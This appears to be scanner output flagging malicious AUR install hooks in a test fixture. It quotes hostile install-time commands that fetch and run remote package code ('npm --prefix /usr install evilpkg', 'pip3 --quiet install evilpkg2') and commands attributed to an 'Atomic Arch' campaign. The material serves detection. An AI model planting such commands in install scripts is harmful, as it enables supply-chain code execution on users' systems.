[CRITICAL] INSTALL-004 Language package manager invoked in install hook (install script)
    An install scriptlet invokes a language package manager to fetch/install packages. Installing a package runs its arbitrary build/lifecycle scripts (preinstall, build.rs, setup.py, go generate, ...) at install time -- a remote code execution vector. The June 2026 Atomic Arch campaign used `npm install` this way (see ATOMIC-002); the same applies to pip, poetry, uv, pdm, cargo, go, gem, composer, conda, deno, and others.
    Location: tests/fixtures/malicious/pm-flag-evasion/nodeprep.install:3
    Code:     pip3 --quiet install evilpkg2
    Recommendation: Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.
    Reference: CWE-494

[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
    Location: tests/fixtures/malicious/pm-flag-evasion/nodeprep.install:2
    Code:     npm --prefix /usr install evilpkg
    Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
    Reference: CWE-494



